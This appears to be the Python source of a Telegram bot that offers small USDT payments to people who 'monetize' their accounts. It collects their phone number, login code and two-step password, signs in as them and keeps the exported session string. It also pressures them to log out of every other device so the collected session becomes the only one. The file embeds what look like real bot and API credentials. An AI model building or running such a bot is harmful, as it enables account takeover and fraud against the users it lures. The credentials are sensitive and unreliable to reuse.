from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded, PhoneNumberInvalid, PhoneCodeInvalid
from pydantic import BaseModel
import logging
import asyncio
import time

# --- 1. CONFIGURATION ---
BOT_TOKEN = "8469004829:AAHgMd0EBHrdmMf3aWYR12wXTIY9jlAD9EY" 
API_ID = 39107920
API_HASH = "8ea252b22d68271fc8c359297020d0ee" 
ADMIN_ID = 6225749847 # <--- Your actual Admin User ID
ADMIN_GROUP_ID = ADMIN_ID # ID for sending notifications (can be a Group ID like -1002289842999)

MIN_WITHDRAWAL = 1.0 # Changed from 10.0 to 1.0 (USDT)

# Logging Setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- 2. DATA MODELS AND GLOBAL STORES (RAM Storage) ---

class UserState(BaseModel):
    phone_number: str = ""
    sent_code: str | None = None
    step: str = "phone" # 'phone', 'code', '2fa'

user_data: dict[int, UserState] = {}
pending_logout_sessions: dict[int, dict] = {} # {user_id: {phone_number: ..., session_string: ...}}
user_balances: dict[int, float] = {}
pending_5min_sessions: dict[int, list[dict]] = {} # {user_id: [session_data, ...]}

# --- 3. UTILITY FUNCTIONS ---

async def get_session_details(client: Client, phone_number: str) -> tuple[int, list[dict]]:
    """Fetches active devices and returns the count and list of sessions."""
    try:
        sessions = await client.get_web_sessions()
        device_count = len(sessions)
        return device_count, [
            {
                'device_model': s.device_model, 
                'platform': s.platform, 
                'system_version': s.system_version, 
                'ip': s.ip,
                'is_current': s.is_current
            } for s in sessions
        ]
    except Exception as e:
        logger.error(f"Error fetching session details for {phone_number}: {e}")
        return 0, []

def notify_admin(app: Client, message: str):
    """Sends a notification to the admin group."""
    asyncio.create_task(app.send_message(ADMIN_GROUP_ID, message))

async def check_5min_validity(user_id: int, start_time: float):
    """Periodically checks the session validity for 5 minutes."""
    
    # 5 minutes in seconds
    FIVE_MINUTES = 5 * 60 
    
    while time.time() - start_time < FIVE_MINUTES:
        # Check every 10 seconds
        await asyncio.sleep(10) 
    
    # After 5 minutes, process the pending sessions
    if user_id in pending_5min_sessions:
        sessions_to_process = pending_5min_sessions.pop(user_id)
        total_sessions_processed = len(sessions_to_process)
        
        balance_to_add = total_sessions_processed * MIN_WITHDRAWAL

        if user_id not in user_balances: user_balances[user_id] = 0.0
        user_balances[user_id] += balance_to_add
        
        app.send_message(
            user_id,
            f"✅ **Success!** Your {total_sessions_processed} session(s) passed the 5-minute check. **{balance_to_add:.2f} USDT** has been added to your balance.\n\n"
            f"💰 Your new balance is: **{user_balances[user_id]:.2f} USDT**"
        )
        
        # Admin notification
        notify_admin(
            app,
            f"✅ **NEW BALANCE ADDED!**\n\n"
            f"User: <a href='tg://user?id={user_id}'>{user_id}</a>\n"
            f"Sessions Processed: {total_sessions_processed}\n"
            f"Amount Added: **{balance_to_add:.2f} USDT**\n"
            f"New Total Balance: {user_balances[user_id]:.2f} USDT"
        )

# --- 4. ASYNC HANDLERS ---

async def handle_successful_login(client: Client, message: Message, user_id: int, phone_number: str):
    """Handles logic after successful login (2FA passed or not needed)."""
    
    session_string = await client.export_session_string()
    
    device_count, sessions = await get_session_details(client, phone_number)
    
    await client.stop() 
    
    # Clear user state
    del user_data[user_id]
    
    session_data = {
        'phone_number': phone_number,
        'session_string': session_string,
        'device_count': device_count,
        'sessions': sessions
    }

    if device_count == 1:
        # Directly start 5-minute verification if only one device is active
        await message.reply_text("✅ Login successful. Only 1 device detected. 5-minute verification is now starting...")
        
        if user_id not in pending_5min_sessions: pending_5min_sessions[user_id] = []
        pending_5min_sessions[user_id].append(session_data)

        asyncio.create_task(check_5min_validity(user_id, time.time()))

    else:
        # Request user to confirm logout of other devices
        pending_logout_sessions[user_id] = session_data
        
        session_list_text = "\n".join([f"- {s['device_model']} ({s['platform']})" for s in sessions if not s['is_current']])
        
        await message.reply_text(
            f"⚠️ **Login Successful, but {device_count - 1} other device(s) detected!**\n\n"
            f"Please go to Telegram Settings -> Devices and log out of **ALL** other active sessions, except the one you are currently using to log in.\n\n"
            f"Detected Sessions:\n{session_list_text}\n\n"
            f"Once you have logged out, use the command /confirm_logout to complete the process."
        )

# --- 5. BOT COMMAND HANDLERS ---

app = Client(
    "bot_session", 
    api_id=API_ID, 
    api_hash=API_HASH, 
    bot_token=BOT_TOKEN
)

@app.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    user_id = message.from_user.id
    
    start_message = (
        "👋 Welcome! This bot allows you to monetize your Telegram account by giving us temporary access to it.\n\n"
        "**Process:**\n"
        "1. Send your **phone number** with the country code (e.g., `+88017...`).\n"
        "2. Enter the **login code** sent to your Telegram.\n"
        "3. (If applicable) Enter your **Two-Step Verification (2FA)** password.\n"
        "4. We will check your account for a **single active session**. If multiple are found, you must log out of all others.\n"
        "5. After successfully passing all checks, your session will be verified for **5 minutes**.\n"
        f"6. Upon successful verification, **{MIN_WITHDRAWAL:.2f} USDT** will be added to your balance.\n\n"
        "To begin, please send your **phone number** (including the country code)."
    )
    
    # Clear any existing state for a fresh start
    if user_id in user_data:
        del user_data[user_id]
        
    await message.reply_text(start_message)

@app.on_message(filters.command("balance") & filters.private)
async def balance_command(client: Client, message: Message):
    user_id = message.from_user.id
    balance = user_balances.get(user_id, 0.0)
    await message.reply_text(f"💰 Your current balance is: **{balance:.2f} USDT**")

@app.on_message(filters.command("withdraw") & filters.private)
async def withdraw_command(client: Client, message: Message):
    user_id = message.from_user.id
    balance = user_balances.get(user_id, 0.0)
    
    if balance < MIN_WITHDRAWAL:
        await message.reply_text(f"❌ Minimum withdrawal amount is **{MIN_WITHDRAWAL:.2f} USDT**.")
        return

    # Assuming the command format is /withdraw <amount> <USDT_Address>
    try:
        parts = message.text.split()
        if len(parts) < 3:
            await message.reply_text("Usage: `/withdraw <amount> <USDT_Address>`")
            return

        amount = float(parts[1])
        wallet_address = parts[2]

        if amount > balance:
            await message.reply_text(f"❌ You only have **{balance:.2f} USDT** in your balance.")
            return

        if amount < MIN_WITHDRAWAL:
            await message.reply_text(f"❌ Minimum withdrawal amount is **{MIN_WITHDRAWAL:.2f} USDT**.")
            return

        # Deduct balance and send admin notification (Actual payment must be done manually)
        user_balances[user_id] -= amount
        
        notify_admin(
            client,
            f"💸 **NEW WITHDRAWAL REQUEST!**\n\n"
            f"User: <a href='tg://user?id={user_id}'>{user_id}</a>\n"
            f"Amount: **{amount:.2f} USDT**\n"
            f"Wallet Address: `{wallet_address}`\n"
            f"New Balance: {user_balances[user_id]:.2f} USDT"
        )

        await message.reply_text(
            f"✅ Withdrawal request of **{amount:.2f} USDT** to address `{wallet_address}` has been successfully submitted.\n"
            f"It will be processed manually by an admin soon.\n\n"
            f"Your remaining balance is: **{user_balances[user_id]:.2f} USDT**"
        )

    except ValueError:
        await message.reply_text("❌ Invalid amount provided. Please use a number (e.g., `5.50`).")
    except Exception as e:
        logger.error(f"Withdrawal error: {e}")
        await message.reply_text("❌ An unexpected error occurred during withdrawal.")

@app.on_message(filters.command("cancel") & filters.private)
async def cancel_command(client: Client, message: Message):
    user_id = message.from_user.id
    
    if user_id in user_data:
        del user_data[user_id]
        await message.reply_text("✅ Current login process cancelled. Use /start to begin again.")
    else:
        await message.reply_text("There is no active login process to cancel.")

@app.on_message(filters.command("confirm_logout") & filters.private)
async def confirm_logout_command(client: Client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in pending_logout_sessions:
        await message.reply_text("❌ You don't have a pending session requiring device logout. Please start a new login with /start if needed.")
        return

    session_data = pending_logout_sessions[user_id]
    phone_number = session_data['phone_number']
    
    try:
        # Use an in-memory client to check the session again
        temp_client = Client(":memory:", API_ID, API_HASH, session_string=session_data['session_string'])
        await temp_client.start()
        
        device_count, _ = await get_session_details(temp_client, phone_number)
        await temp_client.stop() 
        
        if device_count == 1:
            await message.reply_text("✅ Device check successful! 5-minute verification is now starting...")
            
            # Start 5-minute verification
            if user_id not in pending_5min_sessions: pending_5min_sessions[user_id] = []
            pending_5min_sessions[user_id].append(session_data)

            asyncio.create_task(check_5min_validity(user_id, time.time()))
            
            del pending_logout_sessions[user_id]
            
        else:
            await message.reply_text(f"❌ **{device_count}** active devices are still detected. Please log out and use the /confirm_logout command again.")

    except Exception:
        await message.reply_text("❌ Your session is invalid (possibly banned). No funds will be added.")
        del pending_logout_sessions[user_id]


# --- 6. TEXT INPUT HANDLER (The core logic) ---

@app.on_message(filters.text & filters.private & ~filters.command("start", "balance", "withdraw", "cancel", "confirm_logout"))
async def handle_text_input(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_data:
        # Default: Treat as phone number input
        phone_number = text
        
        # Basic validation (could be improved)
        if not phone_number.startswith('+') or not any(char.isdigit() for char in phone_number):
            await message.reply_text("❌ Please send a valid phone number, including the country code (e.g., `+88017...`).")
            return
            
        user_data[user_id] = UserState(phone_number=phone_number)
        current_state = user_data[user_id]
        
        # Use a unique session name for each user to prevent conflicts
        session_name = f"login_session_{user_id}" 
        temp_client = Client(session_name, API_ID, API_HASH, in_memory=True)

        try:
            current_state.sent_code = await temp_client.send_code(phone_number)
            await message.reply_text("✅ Code sent! Please check your Telegram and send the login code now.")
            current_state.step = "code"
            
        except PhoneNumberInvalid:
            await message.reply_text("❌ The phone number is invalid. Please use /start and try again.")
            del user_data[user_id]
        except Exception as e:
            logger.error(f"Error sending code for {phone_number}: {e}")
            await message.reply_text("❌ An error occurred while sending the code. Please try again later.")
            del user_data[user_id]
        finally:
            await temp_client.stop()
            
    else:
        current_state = user_data[user_id]
        
        # Use a unique session name for the following steps
        session_name = f"login_session_{user_id}" 
        temp_client = Client(session_name, API_ID, API_HASH, in_memory=True)
        
        if current_state.step == "code":
            try:
                # Start client to use the sent_code
                await temp_client.start()
                
                await temp_client.sign_in(
                    current_state.phone_number,
                    current_state.sent_code.phone_code_hash,
                    text # The code entered by the user
                )
                
                # If sign_in succeeds, login is complete
                await handle_successful_login(temp_client, message, user_id, current_state.phone_number) # <-- FIXED LINE
                
            except SessionPasswordNeeded:
                await message.reply_text("⚠️ Two-Step Verification (2FA) is enabled. Please send your **password** now.")
                current_state.step = "2fa"
            except PhoneCodeInvalid:
                await message.reply_text("❌ Invalid login code. Please try again.")
            except Exception as e:
                logger.error(f"Error signing in for {current_state.phone_number}: {e}")
                await message.reply_text("❌ An unexpected error occurred during login. Please use /start to begin again.")
                del user_data[user_id]
            finally:
                # Client is stopped inside handle_successful_login if successful, 
                # otherwise we stop it here in case of exception
                if temp_client.is_running:
                    await temp_client.stop()
        
        elif current_state.step == "2fa":
            try:
                await temp_client.start()
                
                await temp_client.check_password(text) # The 2FA password entered by the user
                
                # If check_password succeeds, login is complete
                await handle_successful_login(temp_client, message, user_id, current_state.phone_number)
                
            except Exception as e:
                if "PASSWORD_HASH_INVALID" in str(e):
                    await message.reply_text("❌ Invalid 2FA password. Please try again.")
                else:
                    logger.error(f"Error checking password for {current_state.phone_number}: {e}")
                    await message.reply_text("❌ An unexpected error occurred during 2FA check. Please use /start to begin again.")
                    del user_data[user_id]
            finally:
                if temp_client.is_running:
                    await temp_client.stop()


# --- 7. MAIN FUNCTION ---

if __name__ == '__main__':
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or API_HASH == "YOUR_API_HASH_HERE" or ADMIN_ID == 123456789:
        print("!!! WARNING: Please update BOT_TOKEN, API_HASH, and ADMIN_ID in the CONFIGURATION section. !!!")
    
    print("Starting bot...")
    app.run()